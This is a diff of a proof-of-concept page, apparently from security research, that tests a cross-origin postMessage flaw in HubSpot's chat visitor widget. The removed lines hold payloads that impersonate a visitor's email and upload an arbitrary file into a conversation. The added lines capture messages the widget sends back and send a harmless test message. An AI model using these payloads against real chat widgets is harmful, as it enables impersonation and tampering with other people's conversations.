@@ -1,18 +1,31 @@
-  <iframe id="w" src="https://app.hubspot.com/conversations-visitor/TARGET_PORTAL/threads/utk/anytoken?url=https://majdch22.github.io"></iframe>
+  <!-- hosted at https://majdch22.github.io -->
+  <iframe id="w"
+    src="https://app.hubspot.com/conversations-visitor/PORTALID/threads/utk/anytoken?url=https://majdch22.github.io"
+  ></iframe>
+
+  <div id="log"></div>
+
   <script>
-  document.getElementById('w').onload = () => {
-    const w = document.getElementById('w').contentWindow;
+  const log = s => document.getElementById('log').innerHTML += '<br>' + s;
 
-    // Inject visitor identity (impersonate a known email)
-    w.postMessage(JSON.stringify({
-      type: 'VISITOR_IDENTIFICATION_ATTRIBUTES',
-      data: { identificationEmail: 'victim@company.com', identificationToken: '' }
-    }), '*');
+  // Step 1: Listen for ANY message coming back from the widget
+  // The widget sends window.parent.postMessage(..., "*") so we receive everything
+  window.addEventListener('message', e => {
+    if (!e.origin.includes('hubspot')) return;
+    log('✅ RECEIVED from widget: origin=' + e.origin + ' data=' +
+        JSON.stringify(e.data).substring(0, 200));
+  });
 
-    // Or: upload arbitrary file into any conversation
-    w.postMessage(JSON.stringify({
-      type: 'SCREEN_CAPTURE_BLOB',
-      data: { dataUrl: 'data:image/png;base64,PAYLOAD', fileName: 'evil.png' }
-    }), '*');
-  };
+  // Step 2: Send injected message once iframe loads
+  document.getElementById('w').addEventListener('load', () => {
+    log('iframe loaded, sending...');
+
+    // Test with REQUEST_OPEN (harmless, visually verifiable)
+    document.getElementById('w').contentWindow.postMessage(
+      JSON.stringify({ type: 'REQUEST_OPEN', data: {} }),
+      '*'   // must use * because HubSpot's iframe is cross-origin
+    );
+
+    log('message sent — watch iframe for widget opening');
+  });
   </script>
